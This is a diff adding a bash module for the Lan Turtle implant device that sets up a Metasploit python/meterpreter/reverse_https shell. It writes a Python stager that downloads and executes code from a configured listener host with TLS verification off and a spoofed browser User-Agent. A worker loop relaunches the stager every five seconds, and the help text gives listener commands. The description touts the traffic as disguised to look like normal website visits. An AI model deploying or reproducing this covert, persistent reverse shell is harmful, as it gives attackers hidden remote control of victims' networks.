@@ -1,0 +1,195 @@
+#!/bin/bash /usr/lib/turtle/turtle_module
+
+# Lan Turtle Meterpreter HTTPS
+# By sn0wfa11 - https://github.com/sn0wfa11
+
+VERSION="1.0"
+DESCRIPTION="Metasploit HTTPS payload for more discrete shells. Uses the python/meterpreter/reverse_https payload. Network traffic looks like visiting an HTTPS website. For best traffic masking, use port 443 for the listener and proxychains or meterpreter port forwarding to send all other traffic through the session."
+CONF=/tmp/meterpreter-https.form
+AUTHOR=sn0wfa11
+
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ESC=255}
+
+function start {
+  if [ -s /etc/config/meterpreter-https ]; then
+    host=$(uci get meterpreter-https.host)
+    port=$(uci get meterpreter-https.port)
+
+    if [[ $host == "" ]]; then
+      echo "Meterpreter HTTPS host is not set."
+      exit 1
+    fi
+
+    if [[ $port == "" ]]; then
+      echo "Meterpreter HTTPS port is not set."
+      exit 1
+    fi
+    
+    if [ ! -s /etc/turtle/meterpreter/met-https-shell ]; then
+      echo -e "\nMeterpreter HTTPS shell script does not exist.\nSetting it up now...\n"
+      create_shell
+    fi
+
+    if [ ! -s /etc/turtle/meterpreter/met-https-worker ]; then
+      echo -e "\nMeterpreter HTTPS worker script does not exist.\nSetting it up now...\n"
+      create_worker
+    fi
+
+    echo "Starting Meterpreter HTTPS to $host:$port"
+    echo "/etc/turtle/meterpreter/met-https-worker &" | at now
+    echo "Meterpreter HTTPS Started with PID:"
+    pidof met-https-worker
+
+  else
+    echo "Meterpreter HTTPS not configured!"
+  fi
+}
+
+function stop {
+  echo "Stopping Meterpreter HTTPS"
+  if pgrep -f met-https-worker > /dev/null; then kill $(pgrep -f met-https-worker); fi
+}
+
+function status {
+  if ps | grep -w -q [/]etc/turtle/meterpreter/met-https-worker; then echo "1"; else echo "0"; fi
+}
+
+function configure {
+  if [ -s /etc/config/meterpreter-https ]; then
+      host=$(uci get meterpreter-https.host)
+      port=$(uci get meterpreter-https.port)
+  else
+      touch /etc/config/meterpreter-https
+  fi
+  
+  dialog --ok-label "Submit" \
+    --help-button \
+    --title "Meterpreter HTTPS Configuration" \
+    --form "Python HTTPS Meterpreter (Metasploit Payload)\n\n\
+Meterpreter HTTPS connects to the host and port you specify." 14 60 3\
+    "Listen Host:"    1 1    "$host"    1 14 48 0 \
+    "Listen Port:"    2 1    "$port"    2 14 48 0 \
+  2>$CONF
+
+  return=$?
+
+  case $return in
+    $DIALOG_OK)
+      cat $CONF | { 
+        read -r host
+        read -r port
+        uci set meterpreter-https.host="$host"
+        uci set meterpreter-https.port="$port"
+        uci commit meterpreter-https
+        rm $CONF
+        clear
+      };;
+
+    $DIALOG_HELP)
+      dialog --title "Help" \
+        --msgbox "\
+Host - IP or Hostname of target meterpreter HTTPS listener\n\
+Port - Port number of target meterpreter HTTPS listener\n \n\
+use exploit/multi/handler               \n\
+# Handles multiple meterpreter sessions\n \n\
+set PAYLOAD python/meterpreter/reverse_https \n\
+# Setting for reverse staged HTTPS meterpreter\n \n\
+set SessionExpirationTimeout [time in seconds]   \n\
+# Session timeout: Default is 604800 (1 Week) \n\
+# Set to 0 for no expiration timeout   \n\
+# Option is unique for http/https payloads\n \n\
+set LHOST [host or ip]                  \n\
+# Hostname or IP of listener\n \n\
+set LPORT [port number]                 \n\
+# Port of listener\n \n\
+set ExitOnSession false                 \n\
+# Let the exploit continue when meterpreter exists\n \n\
+exploit -j                              \n\
+# Make the exploit a backgroundable job\n \n\
+sessions                                \n\
+# Lists sessions\n \n\
+sessions -i [number]                    \n\
+# Interacts with session number\n \n\
+" 20 74
+      configure
+      ;;
+    $DIALOG_CANCEL)
+      rm $CONF
+      clear
+      exit;;
+    $DIALOG_ESC)
+      clear;;
+  esac
+}
+
+function create_shell {
+  mkdir -p /etc/turtle/meterpreter
+  cat << EOF > /etc/turtle/meterpreter/met-https-shell
+#!/usr/bin/python
+
+# Lan Turtle Meterpreter HTTPS Payload
+# By sn0wfa11 - https://github.com/sn0wfa11
+
+import sys, string, random, ssl, subprocess
+
+HOST = subprocess.Popen("uci get meterpreter-https.host", shell=True, stdout=subprocess.PIPE).stdout.read()
+HOST = HOST.replace("\n", "")
+PORT = subprocess.Popen("uci get meterpreter-https.port", shell=True, stdout=subprocess.PIPE).stdout.read()
+PORT = PORT.replace("\n", "")
+
+# Generate a Metasploit https Handler Compatible Checksum for the URL
+# Ported to this project from Veil-Evasion - https://github.com/Veil-Framework/Veil-Evasion
+def get_url(host, port):
+  check_sum = 80 # Python Checksum for MSF Payloads
+  base = string.ascii_letters + string.digits
+  for x in xrange(64):
+    leng = random.randint(8, 60)
+    uri = "".join(random.sample(base, leng))
+    candidate = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
+    for char in candidate:
+      if checksum8(uri + char) == check_sum:
+        return "https://" + host + ":" + port + "/" + uri + char
+
+# Helper for the Metasploit https Checksum Algorithm
+def checksum8(string):
+  return sum([ord(char) for char in string]) % 0x100
+
+# Send Shell
+# From the MSF python/meterpreter/reverse_https raw output.
+vi=sys.version_info
+ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
+hs=[]
+if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
+  sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+  sc.check_hostname=False
+  sc.verify_mode=ssl.CERT_NONE
+  hs.append(ul.HTTPSHandler(0,sc))
+o=ul.build_opener(*hs)
+o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
+try:
+  exec(o.open(get_url(HOST, PORT)).read())
+except:
+  print "Unable to connect."
+
+EOF
+  chmod +x /etc/turtle/meterpreter/met-https-shell
+}
+
+function create_worker {
+  mkdir -p /etc/turtle/meterpreter
+  cat << EOF > /etc/turtle/meterpreter/met-https-worker
+#!/bin/bash
+
+while [ 1 -eq 1 ]
+do
+  if ! pgrep -f met-https-shell > /dev/null; then /etc/turtle/meterpreter/met-https-shell; fi
+  sleep 5
+done
+EOF
+  chmod +x /etc/turtle/meterpreter/met-https-worker
+}
+
